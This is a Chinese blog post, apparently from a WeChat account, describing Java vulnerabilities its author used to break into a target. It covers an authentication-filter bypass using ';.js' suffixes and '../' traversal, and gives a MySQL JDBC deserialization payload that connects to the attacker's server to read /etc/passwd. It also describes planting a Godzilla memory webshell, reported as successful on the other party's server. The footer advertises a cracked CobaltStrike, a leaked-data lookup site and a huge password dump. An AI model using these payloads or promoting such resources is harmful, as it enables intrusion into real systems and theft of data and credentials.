#  最近打点用的一些java漏洞   
 进击的HACK   2024-12-12 23:55  
  
好久没写文章了，把最近打点审的几个漏洞分享一下。  
  
## filter权限绕过  
  
  
  
在 CurrentContextFilter 里，有四个关键方法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7JEcvomvgSAweWrPzEY00pRxibx2HTSsE9YpgYmcnjxCeOePK8JTFV8A/640?wx_fmt=png&from=appmsg "")  
  
需要关注的方法，很明显可以看出，应该是：  
  
isExcludeResource(request.getRequestURI()) isStaticResource(request.getRequestURI()) isAnonPermission(request)  
  
从方法命名上可以看见分别代表含义 "是否排除的资源"、"是否是静态资源"、"是否是匿名权限"  
  
## 分析  
  
  
**isExcludeResource**  
  
isExcludeResource(request.getRequestURI()) 是判断当前url是否包含  
  
```
/xxxinterface/invoke
/metadata/xxx/findList"/ui/xxx/xxxLayoutPath"
/metadata/xxx/xxxColumns"/metadata/xxxx/xxxScene/ui/xxx/xxxPath
```  
  
  
  
如果包含以上值，则返回值是 true  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7zt27icJs5vyAwAHmv8q910t6b9JygmbZ7Uf1LCrUEvVHDIk5MmnuJNw/640?wx_fmt=png&from=appmsg "")  
  
**isStaticResource**  
  
  
isStaticResource(request.getRequestURI()) 是判断当前url是否包含****  
  
```
/static
/scripts
/css
.js
/js
.png
.jpg
/images
/fonts
.css
.html
/bpm/editor-app
.svg
.gif

```  
  
  
如果包含，返回值是 true  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7LAAwT6WwBN3d65ibqYTO5DkVN30yquaFnNmks0600cw0CqKh7BpO6fA/640?wx_fmt=png&from=appmsg "")  
  
在CurrentContextFilter里面，当两个方法返回值是true时，返回值是null。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7NhXcic4nAZib7Sf9pS0SxicF8TIgREwr2pRMT58Duhg3GRSluz8LDfxow/640?wx_fmt=png&from=appmsg "")  
  
在 dofilter 方法里面，也就是该 filter 触发时，如果当前 userAuthInfo 的值是 null，会直接去更新当前上下文 updateCurrentContext，也就是逻辑正常走完，没有中途通过 return 去退出。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7jDyFiaMSILftUOWeXt469XQPAic2MvgjShekoh8vV9qrqXQPk18nOfEQ/640?wx_fmt=png&from=appmsg "")  
  
**isAnonPermission**  
  
  
实际分析发现，此处是通过验证 redis 里面的 user-token 是否有效去验证用户权限的，因此不在分析范围内。  
  
## 漏洞验证  
  
  
直接访问某个接口的时候，会提示 Token is not present.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7jIiao7e51S6ezFBzCqc0WnY5RiaxtdhibbMicGQZ7x1MgrL643tjtuslAQ/640?wx_fmt=png&from=appmsg "")  
  
也就是在 getUserAuthInfo 方法里面执行到了下面这个位置  
  
如果想要跳过该 401 的提示，则需要将逻辑执行到上面的 return null 处。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7SiaTqsf5503QU36ic4IalTK3bPQvIDlkMwv1vl8icpaqAQJIshneHH3Ew/640?wx_fmt=png&from=appmsg "")  
  
此时就很清晰了，可以通过在 isStaticResource 方法或 isExcludeResource 方法去跳过该逻辑。  
  
以 isStaticResource 为例 也就是在当前的 url 里面添加静态资源或者添加某几个 url 即可绕过该限制。  
  
如通过在当前 url 添加静态资源后缀 js 时（;.js或者是#.js，#需要url编码为%23），即可绕过该 401 限制，回显数据。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7icQ2DnzLK3Cz85VZmZmnDoBsJPA1u9VUEzibUApLx3mAVXqHy1Z4Bj3g/640?wx_fmt=png&from=appmsg "")  
  
以 isExcludeResource 为例  
  
如在当前的 url 里面添加特殊的 url，再利用 ../ 去跨越路径也可以绕过。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7618M4ZHBC66Hk84BJQR2F7GQMx9HibiaSdQOYhZ1aAhzT2hjGutqVs5w/640?wx_fmt=png&from=appmsg "")  
  
其他情况？  
  
如果走 2 和 3 的逻辑，则 token 是在 redis 里面存着的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7JPNVSkD98dQ3znlOlF4RpLnOKSjTL9o33GnmlyibwJwGibC5BLiaWEibnQ/640?wx_fmt=png&from=appmsg "")  
  
这种情况无法去伪造，即便是 jwt 的密钥是硬编码的情况下。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC74Ha7XKap2Yx2c0zLO9RDF9NNLRKIiaepibmwHsoaDkugzYBH9GvhVUIQ/640?wx_fmt=png&from=appmsg "")  
  
如果请求头里面的 token 是以 basic 为开始的，则有可能可以去伪造 token  
  
即 Authorization: Basic YWRtaW46MTIzNDU2  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7d0pyJtsibU4uXsmBibVboZXsz5b5GSRD7fobXXGqbqZIV4iaQZoUcv2Ag/640?wx_fmt=png&from=appmsg "")  
  
但暂时未在当前 jar 里面找到实现该逻辑的代码块。  
  
## Mysql jdbc反序列化  
  
  
在 DmXXXXController 里  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7avEibvEkqwlpEzSIbYQvhNWufzqjhOExvGAK7KR9NpbLyOvZ7tKboNQ/640?wx_fmt=png&from=appmsg "")  
  
在 DmXXXServiceImpl 里面找到 importDmByJdbc 的实现方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7QqCicwwq8Jibxo15OMxYBoibxNBZP59Yf7IDJLMDyiczqN66lC8zDXqAkA/640?wx_fmt=png&from=appmsg "")  
  
再跟入到 JdbcUtils.getMetaTableList 里面看见了 DriverManager.getConnection，且 url 可控和 lib 目录下存在 mysql-connector-java-8.0.14.jar，也就能打mysql jdbc反序列化漏洞了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7micMe2t3K3VnBSAHLaoQG4rYGib34nB5kcbwpWIjQ9104rtxb9wVH7ZQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7FBOC9eMXjrv9NgOnd4OHFJCeSQp2ysDDo6GyFYqJXjcXWiaFZBdtUibA/640?wx_fmt=png&from=appmsg "")  
  
## 漏洞验证  
  
  
构造读取 /etc/passwd 的 payload  
  
```
{"url":"jdbc:mysql://x.x.x.x:3308/test?user=base64ZmlsZXJlYWRfL2V0Yy9wYXNzd2Q=","user":"base64ZmlsZXJlYWRfL2V0Yy9wYXNzd2Q=","pwd":"123","appCode":"admin"}

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC71MQIWnJoqAL21tHpH6Wu88przmvCFGiazReloTH9nARBYtJv8u13UBg/640?wx_fmt=png&from=appmsg "")  
  
vps 上收到请求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7CIicJ2h4C1zQegeb4sUMMt8mf578dcoSKQ8CIhlXGI5COTrt37Ckpkw/640?wx_fmt=png&from=appmsg "")  
  
然后就成功读取到对方 linux 服务器上的文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7QWtx1I7xdJYL4z2EotnBCGiamMvKYxp6VJguQbbgc8Lc9zdMvSbqfdg/640?wx_fmt=png&from=appmsg "")  
  
此时尝试打内存马，用的cb链生成的哥斯拉内存马。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7hD3jm8WibaLIgrPLleE5UUeJMicfER30cnhLuaiaHqlyvxIYB0MzYKJ8g/640?wx_fmt=png&from=appmsg "")  
  
发包后服务器收到请求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7xfOCNMcFibzGeA7bndvbvQvOvOt6Ktqe43ssFwQpuPx1GKIZ3GB8Spg/640?wx_fmt=png&from=appmsg "")  
  
哥斯拉尝试连接，并连接成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7fWKGfCwGo66BiaiabpNU1s8MmNkMybbu7Ygic7nG661vqr2ubTs65U1BQ/640?wx_fmt=png&from=appmsg "")  
  
## Fastjson+groovy反序列化  
  
  
此处也能通过 fastjson+groovy 去打内存马  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7kOf50qnb3wVFG63PLV8sevUuv2PqX2nQ22KzZ7CP4XGVK4b0fPUCOQ/640?wx_fmt=png&from=appmsg "")  
  
且存在 groovy 的依赖  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaHPCQdRh2mCiaBvxTF54w6bMvfIvaVAC7WzpY2pX5No7FWqzUWe2lcORcv12ibyb0AMX6T0DdDES6eyu8zNrHZqw/640?wx_fmt=png&from=appmsg "")  
  
## 总结  
  
  
多审计 day，打点才能事半功倍。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HWREJselCribXKZnW4g6I2gicDlib73KLnWBMib7xPga814txqfxcPWBtkYhkXX3BVdG42szWtx3eib5YmzeeuoibE1Q/640?wx_fmt=png "")  
  
关注公众号后台回复 0001  
 领取域渗透思维导图，0002  
 领取VMware 17永久激活码，0003  
 获取SGK地址，0004  
 获取在线ChatGPT地址，0005  
 获取 Windows10渗透集成环境  
，0006  
 获取 CobaltStrike 4.9.1破解版  
，  
0007  
 获取  
100亿密码合集  
  
  
  
  
  
加我微信好友，邀请你进交流群  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaHPCQdRh2mD7k15P3gvI6IxzUohyGZicOqn7LDO0yXmtSuZtNh9gWULo1m2N435YwLmtlMFQibzTAuB4d4dMbjMw/640?wx_fmt=png "")  
  
  
备用号，欢迎关注  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/MfTd6rd9CyvNRMW8I9cvI1CK5gKiaYqg2veTn9t9dAe1GxYic7pAvgvRIKNFickConFyX8AvW2reAq8GchJI6aBpA/640?wx_fmt=gif "")  
  
  
  
